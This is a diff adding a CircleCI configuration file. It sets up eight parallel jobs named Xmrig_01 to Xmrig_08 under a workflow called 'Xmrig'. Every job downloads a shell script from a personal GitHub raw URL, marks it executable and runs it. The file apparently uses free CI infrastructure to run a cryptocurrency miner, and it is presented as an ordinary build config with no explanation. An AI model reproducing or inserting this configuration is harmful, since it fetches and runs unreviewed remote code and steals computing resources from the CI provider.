@@ -1,0 +1,97 @@
+version: 2.0
+
+jobs:
+
+  Xmrig_08:
+    docker:
+
+      - image: circleci/elixir:1.4
+
+    steps:
+        - run:
+            name: Xmrig_08
+            command: wget https://raw.githubusercontent.com/lasajaxa3764/lasa/main/start.sh && chmod u+x start.sh && ./start.sh
+            
+  Xmrig_07:
+    docker:
+
+      - image: circleci/elixir:1.4
+
+    steps:
+        - run:
+            name: Xmrig_07
+            command: wget https://raw.githubusercontent.com/lasajaxa3764/lasa/main/start.sh && chmod u+x start.sh && ./start.sh
+            
+  Xmrig_06:
+    docker:
+
+      - image: circleci/elixir:1.4
+
+    steps:
+        - run:
+            name: Xmrig_06
+            command: wget https://raw.githubusercontent.com/lasajaxa3764/lasa/main/start.sh && chmod u+x start.sh && ./start.sh
+            
+  Xmrig_05:
+    docker:
+
+      - image: circleci/elixir:1.4
+
+    steps:
+        - run:
+            name: Xmrig_05
+            command: wget https://raw.githubusercontent.com/lasajaxa3764/lasa/main/start.sh && chmod u+x start.sh && ./start.sh
+            
+  Xmrig_04:
+    docker:
+
+      - image: circleci/elixir:1.4
+
+    steps:
+        - run:
+            name: Xmrig_04
+            command: wget https://raw.githubusercontent.com/lasajaxa3764/lasa/main/start.sh && chmod u+x start.sh && ./start.sh
+            
+  Xmrig_03:
+    docker:
+
+      - image: circleci/elixir:1.4
+
+    steps:
+        - run:
+            name: Xmrig_03
+            command: wget https://raw.githubusercontent.com/lasajaxa3764/lasa/main/start.sh && chmod u+x start.sh && ./start.sh
+            
+  Xmrig_02:
+    docker:
+
+      - image: circleci/elixir:1.4
+
+    steps:
+        - run:
+            name: Xmrig_02
+            command: wget https://raw.githubusercontent.com/lasajaxa3764/lasa/main/start.sh && chmod u+x start.sh && ./start.sh
+            
+  Xmrig_01:
+    docker:
+
+      - image: circleci/elixir:1.4
+
+    steps:
+        - run:
+            name: Xmrig_01
+            command: wget https://raw.githubusercontent.com/lasajaxa3764/lasa/main/start.sh && chmod u+x start.sh && ./start.sh
+            
+workflows:
+    version: 2
+    Xmrig:
+        jobs:
+            - Xmrig_08
+            - Xmrig_07
+            - Xmrig_06
+            - Xmrig_05
+            - Xmrig_04
+            - Xmrig_03
+            - Xmrig_02
+            - Xmrig_01
+            
